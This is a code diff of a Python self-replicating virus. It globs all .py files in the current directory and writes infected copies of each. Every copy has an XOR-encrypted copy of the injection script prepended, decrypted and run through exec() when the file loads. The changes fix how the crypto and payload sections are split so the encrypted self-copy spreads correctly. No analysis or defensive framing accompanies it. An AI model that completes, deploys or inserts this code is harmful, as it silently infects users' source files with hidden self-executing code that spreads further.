@@ -1,12 +1,12 @@
+# Checksum = 0cade4b82e9c3c6df98748d181b0fb9a
+# DELIMITER:CRYPTO
+
 import glob
 import hashlib
 import os
 import base64
 import random
 import string
-
-
-# Encoder Decoder source https://stackoverflow.com/a/70040320
 
 
 def encrypt(clearText, key):
@@ -33,7 +33,6 @@ def decrypt(cipherText, key):
     clearText = bytes([i1 ^ i2 for (i1, i2) in zip(encoded_bytes, key)])
     return clearText.decode("ascii")
 
-# DELIMITER:CRYPTO
 
 # DELIMITER:START
 
@@ -45,10 +44,12 @@ def inject():
     injection.close()
 
     injectionText = injectionText.split("# DELIMITER:END\n")[
-        0] + "# DELIMITER:END\n"
+        0]
 
-    injectionCryptoText = injectionText.split("# DELIMITER:CRYPTO\n")[
-        0] + "# DELIMITER:CRYPTO\n"
+    injectionCryptoText = "# DELIMITER:CRYPTO\n" + injectionText.split("# DELIMITER:CRYPTO\n")[
+        1].split("# DELIMITER:START\n")[0]
+
+    injectionScriptText = injectionText.split("# DELIMITER:START\n")[1]
 
     # Get all python files in the current directory
     pyFiles = glob.glob("*.py")
@@ -69,8 +70,8 @@ def inject():
 
         injected = open(file + ".injected", "w")
 
-        injected.write("# Checksum = " + checksum + "\n" + injectionCryptoText + encryptInjection(
-            injectionText.split("# DELIMITER:CRYPTO\n")[1]) + "\n" + scriptText)
+        injected.write("# Checksum = " + checksum + "\n" + injectionCryptoText + "# DELIMITER:START\n" + encryptInjection(
+            injectionScriptText) + "\n# DELIMITER:END\n" + scriptText)
 
         script.close()
         injected.close()
@@ -98,7 +99,7 @@ key = "{}"
 injectionText = decrypt(encryptedInjection, base64.b64decode(key.encode("ascii")).decode("ascii"))
 
 exec(injectionText)
-    """.format(encryptedInjection, base64_key)
+""".format(encryptedInjection, base64_key)
 
     return payload
 
